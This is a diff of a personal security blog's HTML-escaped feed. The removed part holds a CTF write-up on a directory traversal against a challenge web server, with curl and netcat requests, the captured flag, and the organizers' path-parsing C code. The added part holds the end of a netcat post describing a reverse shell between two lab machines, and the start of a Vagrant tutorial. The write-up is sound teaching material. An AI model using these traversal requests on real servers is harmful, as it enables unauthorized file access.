-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/php.jpg&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;php.jpg&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/dj1.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;dj1.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/secret_images&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;secret_images&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/jboogie.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;jboogie.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/dj3.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;dj3.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/aangel1.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;aangel1.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/remail.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;remail.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;You can also list the web app's root by adding 2 slashes.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ curl http://yws-fsiqc922.9447.plumbing//
-&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Directory listing for /&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Directory listing for /&lt;span class="nt"&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//.&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;.&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//images&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;images&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//sounds&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;sounds&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//400.html&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;400.html&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//..&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;..&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//robots.txt&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;robots.txt&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;//index.html&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;index.html&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Following the hint, we have to do a &lt;a href="https://www.owasp.org/index.php/Path_Traversal"&gt;directory traversal attack&lt;/a&gt; and, since directory listing is enabled on the server, we can simply do it on paths instead of specific files.
-Trying to list &lt;code&gt;/..&lt;/code&gt; with curl didn't work and simply showed the website's main page.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ curl &amp;#39;http://yws-fsiqc922.9447.plumbing/..&amp;#39;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Adding multiple &lt;code&gt;../&lt;/code&gt; didn't work either.&lt;/p&gt;
-&lt;p&gt;It finally worked by adding the directory traversal as a query param.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ curl &amp;#39;http://yws-fsiqc922.9447.plumbing/?../..&amp;#39;
-&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Directory listing for /..&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Directory listing for /..&lt;span class="nt"&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/../9447{D1rect0ries_ARe_h4rd}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;9447{D1rect0ries_ARe_h4rd}&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/../.&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;.&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/../..&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;..&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/../gws&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;gws&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/../files&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;files&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Flag: &lt;code&gt;9447{D1rect0ries_ARe_h4rd}&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id="curl-gotcha"&gt;curl gotcha&lt;/h2&gt;
-&lt;p&gt;After the CTF, I followed discussions on IRC and learned that curl will "fix" the path for you before sending the query.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="hll"&gt;$ curl -v http://127.0.0.1:8080/../../..
-&lt;/span&gt;* Rebuilt URL to: http://127.0.0.1:8080/
-* Hostname was NOT found in DNS cache
-*   Trying 127.0.0.1...
-* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
-&lt;span class="hll"&gt;&amp;gt; GET / HTTP/1.1
-&lt;/span&gt;&amp;gt; User-Agent: curl/7.38.0
-&amp;gt; Host: 127.0.0.1:8080
-&amp;gt; Accept: */*
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Most people seem to have used BurpSuite or a plain connection with netcat to get the flag:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /.. HTTP/1.1\r\n\r\n&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; nc yws-fsiqc922.9447.plumbing 80
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h2 id="why-adding-it-as-a-query-param-worked"&gt;Why adding it as a query param worked&lt;/h2&gt;
-&lt;p&gt;I didn't understand why adding the directory traversal after a &lt;code&gt;?&lt;/code&gt; worked, since the vulnerability was in the path, not a query param.&lt;/p&gt;
-&lt;p&gt;I looked at the source code that the organizers uploaded after the CTF, and it turns out that the &lt;code&gt;extractUrl&lt;/code&gt; function will strip extra levels of &lt;code&gt;../&lt;/code&gt;.
-It only keeps the last one, so it strips the &lt;code&gt;?&lt;/code&gt; at the same time: &lt;code&gt;?../..&lt;/code&gt; becomes &lt;code&gt;/..&lt;/code&gt;.
-Here is the function from the source code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;extractURL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;urlS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;urlSize&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fileNMaxSize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="c1"&gt;// Verify it starts with &amp;#39;/&amp;#39;.&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urlSize&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;urlS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;urlSize&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;fileNMaxSize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="p"&gt;}&lt;/span&gt;
-        &lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urlS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
-        &lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;../&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-            &lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-            &lt;span class="n"&gt;curS&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="p"&gt;}&lt;/span&gt;
-        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;./&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-            &lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-        &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/index.html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="n"&gt;fileN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;curS&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="p"&gt;}&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;</summary><category term="ctf"></category><category term="directory traversal"></category></entry><entry><title>Virtual machines with Vagrant</title><link href="https://blog.jclariviere.com/posts/virtual-machines-with-vagrant" rel="alternate"></link><updated>2016-01-26T00:00:00-05:00</updated><author><name>Jean-Christophe Lariviere</name></author><id>tag:blog.jclariviere.com,2015-11-23:posts/virtual-machines-with-vagrant</id><summary type="html">&lt;h2 id="what-is-vagrant"&gt;What is Vagrant?&lt;/h2&gt;
-&lt;p&gt;Vagrant is basically a wrapper around virtual machine providers like VirtualBox, VMware or AWS.
+&lt;p&gt;Here, &lt;code&gt;alice&lt;/code&gt; is the attacker. She started her listener and received the shell from &lt;code&gt;bob&lt;/code&gt;, allowing her to run the &lt;code&gt;hostname&lt;/code&gt; command.&lt;/p&gt;&lt;ol class="simple-footnotes"&gt;&lt;li id="sf-netcat-basics-1"&gt;It's possible to simulate these options in OpenBSD's netcat &lt;a href="https://superuser.com/a/691043"&gt;by using named pipes&lt;/a&gt;. &lt;a href="#sf-netcat-basics-1-back" class="simple-footnote-back"&gt;↩︎&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;</content><category term="Cybersecurity"></category><category term="netcat"></category><category term="vagrant"></category></entry><entry><title>Virtual machines with Vagrant</title><link href="https://jclariviere.com/blog/post/virtual-machines-with-vagrant/" rel="alternate"></link><published>2015-11-23T00:00:00-05:00</published><updated>2024-12-19T00:00:00-05:00</updated><author><name>Jean-Christophe Lariviere</name></author><id>tag:jclariviere.com,2015-11-23:/blog/post/virtual-machines-with-vagrant/</id><summary type="html">&lt;p&gt;&lt;strong&gt;2024 update: Updated links and use &lt;code&gt;kalilinux/rolling&lt;/code&gt; instead of the outdated &lt;code&gt;ubuntu/trusty64&lt;/code&gt;. The rest is still relevant today.&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;One of the biggest pain points of using a VM is bootstrapping it.
+Even if you have a pre-packaged VM, you still have to use the UI to import it …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;2024 update: Updated links and use &lt;code&gt;kalilinux/rolling&lt;/code&gt; instead of the outdated &lt;code&gt;ubuntu/trusty64&lt;/code&gt;. The rest is still relevant today.&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;One of the biggest pain points of using a VM is bootstrapping it.
+Even if you have a pre-packaged VM, you still have to use the UI to import it and customize its settings, and then you have to log in to install the packages you need.
+It's possible to use the command line, but the commands are specific to each provider and they're not very user friendly.&lt;/p&gt;
+&lt;p&gt;Vagrant solves this problem. It is basically a wrapper around virtual machine providers like VirtualBox, VMware or AWS.
 You simply need to create a config file (called &lt;code&gt;Vagrantfile&lt;/code&gt;) in a folder, use &lt;code&gt;vagrant up&lt;/code&gt; and you've got a VM up and running in less than 30 seconds!
 The only required entry in the config file is the base image to use, but you can configure multiple properties like port forwarding, IP address, shared folders, amount of memory, script to run on first startup of the machine, etc.
-This is very useful for sharing, as you only need to share a config file instead of a huge VM folder. And it can be &lt;a href="https://en.wikipedia.org/wiki/Version_control"&gt;version controlled&lt;/a&gt;!&lt;/p&gt;
-&lt;h2 id="required-software"&gt;Required software&lt;/h2&gt;
-&lt;p&gt;For this post, I will use VirtualBox, as it's free, well supported and is the only available provider out of the box (you need to install plugins for the others).
-Make sure you have &lt;a href="https://www.virtualbox.org/"&gt;VirtualBox&lt;/a&gt; and &lt;a href="https://docs.vagrantup.com/v2/installation"&gt;Vagrant&lt;/a&gt; installed before continuing.
-Vagrant also uses ruby, but you don't need to install it since it's embedded in Vagrant.&lt;/p&gt;
+This is very useful for sharing, as you only need to share a config file instead of a huge VM folder, which can then be version controlled with &lt;code&gt;git&lt;/code&gt;.&lt;/p&gt;
 &lt;h2 id="getting-started"&gt;Getting started&lt;/h2&gt;
+&lt;h3 id="required-software"&gt;Required software&lt;/h3&gt;
+&lt;p&gt;For this post, I will use the VirtualBox provider, as it's free and available out of the box.
+If you wish to use VMware, you will need to &lt;a href="https://developer.hashicorp.com/vagrant/docs/providers/vmware/installation"&gt;install a plugin&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Make sure you have &lt;a href="https://www.virtualbox.org/"&gt;VirtualBox&lt;/a&gt; and &lt;a href="https://developer.hashicorp.com/vagrant/docs/installation"&gt;Vagrant&lt;/a&gt; installed before continuing.
+Vagrant also uses ruby, but you don't need to install it since it's embedded in Vagrant.&lt;/p&gt;
+&lt;h3 id="basics"&gt;Basics&lt;/h3&gt;
 &lt;p&gt;Here is the most basic &lt;code&gt;Vagrantfile&lt;/code&gt; you can do.&lt;/p&gt;
-&lt;figure class='code'&gt;
-&lt;figcaption&gt;&lt;span&gt;Vagrantfile&lt;/span&gt; &lt;a href='/code/basic-vagrantfile-trusty64/Vagrantfile'&gt;download&lt;/a&gt;&lt;/figcaption&gt;
+&lt;div class="highlight"&gt;&lt;span class="filename"&gt;Vagrantfile&lt;/span&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# -*- mode: ruby -*-&lt;/span&gt;
-&lt;span class="c1"&gt;# vi: set ft=ruby :&lt;/span&gt;
-
-&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;
-
